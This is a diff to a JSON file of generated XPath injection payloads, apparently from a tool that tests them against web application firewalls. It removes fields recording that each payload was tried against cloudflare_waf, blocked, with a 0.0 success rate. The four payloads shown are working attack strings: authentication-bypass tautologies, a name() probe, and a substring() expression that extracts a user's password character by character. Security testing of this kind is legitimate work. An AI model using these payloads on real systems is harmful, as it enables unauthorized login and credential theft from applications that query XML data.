@@ -10,12 +10,7 @@
       "payload": "' or '1'='1",
       "description": "XPath OR bypass",
       "technique": "basic",
-      "source": "generated",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "xpath_injection-1002",
@@ -24,12 +19,7 @@
       "payload": "' or 1=1 or ''='",
       "description": "XPath numeric bypass",
       "technique": "basic",
-      "source": "generated",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "xpath_injection-1003",
@@ -38,12 +28,7 @@
       "payload": "x' or name()='username' or 'x'='y",
       "description": "XPath name() function",
       "technique": "basic",
-      "source": "generated",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     },
     {
       "id": "xpath_injection-1004",
@@ -52,12 +37,7 @@
       "payload": "' or substring(//user[position()=1]/password,1,1)='a",
       "description": "XPath substring",
       "technique": "basic",
-      "source": "generated",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "generated"
     }
   ]
 }
